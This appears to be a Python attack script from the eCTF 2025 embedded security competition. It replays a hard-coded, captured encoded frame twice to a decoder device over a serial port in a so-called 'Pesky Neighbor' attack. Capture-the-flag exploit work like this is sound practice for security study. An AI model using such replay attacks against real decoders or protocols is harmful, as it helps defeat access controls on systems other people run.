import time
import sys

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def lgmt_channel_1() -> bytes:
    """Xinyue
        Generate a new encode frame and send it to decode
    """
    lgmt_frame_channel1 = b'\x01\x00\x00\x00l\x075\xef\x0b\x1f\x07\x00helloX4i\xf0\xc3Mp\x8d\xd8D\x03r]\xed\xf9\xc0\x9a\xe7\x17\xf3\xb0;*.\x81~\xc2\xdf-8lu'
    return lgmt_frame_channel1


if __name__ == '__main__':
    print("Running Pesky Neighbor attack")
    time.sleep(1)
    
    # The serial port string will be in argv[1]
    interface = DecoderIntf(sys.argv[1])
    # Replay lgmt channel 0 frame
    interface.decode(lgmt_channel_1())
    interface.decode(lgmt_channel_1())

    print("Done with pesky Neighbor attack")